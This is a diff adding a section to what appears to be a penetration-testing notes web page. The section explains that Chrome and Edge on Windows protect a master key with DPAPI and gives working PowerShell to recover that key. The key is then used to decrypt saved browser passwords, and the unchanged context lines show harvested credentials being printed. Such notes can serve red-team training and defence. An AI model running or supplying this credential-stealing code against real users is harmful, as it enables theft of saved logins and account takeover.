@@ -637,6 +637,31 @@ grep ./output_folder &quot;password&quot;
     Write-Host &quot;[&quot; $_.Resource &quot;] &quot; $_.Username &quot;: &quot; $_.Password
 }
 </code></pre>
+
+<h3 id="unprotect-strict-using-dapi">Unprotect strict using DAPI</h3>
+<p>Chromium based browsers (Google Chrome, Edge, ...) on Windows use DAPI to encrypt
+the master key within the user session. It's possible to use PowerShell (or the
+Win32API) to recover the master key. With this master key you can decrypt the
+saved passwords from the sqlite database using <a href="../assets/chrome_passwords.py">this script</a></p>
+<pre><code class="language-powershell line-numbers">Add-Type -AssemblyName System.Security
+
+$chrome_dir = $env:LOCALAPPDATA + &quot;\\Google\\Chrome\\User Data&quot;
+# $chrome_dir = $env:LOCALAPPDATA + &quot;\\Microsoft\\Edge\\User Data&quot;
+$chrome_local_state_path = $chrome_dir + &quot;\\Local State&quot;
+$chrome_default_db_path = $chrome_dir + &quot;\\Default\\Login Data&quot;
+
+# Read the encrypted master key from the config file
+$local_state = Get-Content -Raw -Path $chrome_local_state_path
+$r = $local_state -match '&quot;os_crypt&quot;:{&quot;encrypted_key&quot;:&quot;(.*?)&quot;},&quot;password_manager&quot;:{'
+$raw_master_key = $Matches[1]
+
+# Decrypt the master key
+$raw_master_key = [Convert]::FromBase64String($raw_master_key)
+$master_key = [System.Byte[]]::CreateInstance([System.Byte], $raw_master_key.Length-5)
+For ($i=0; $i -lt $raw_master_key.length-5; $i++) { $master_key[$i] = $raw_master_key[$i+5] }
+$master_key = [System.Security.Cryptography.ProtectedData]::Unprotect($master_key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+$master_key_hex = ($master_key | ForEach-Object ToString X2) -join ''
+</code></pre>
             
           </div>
           <footer>
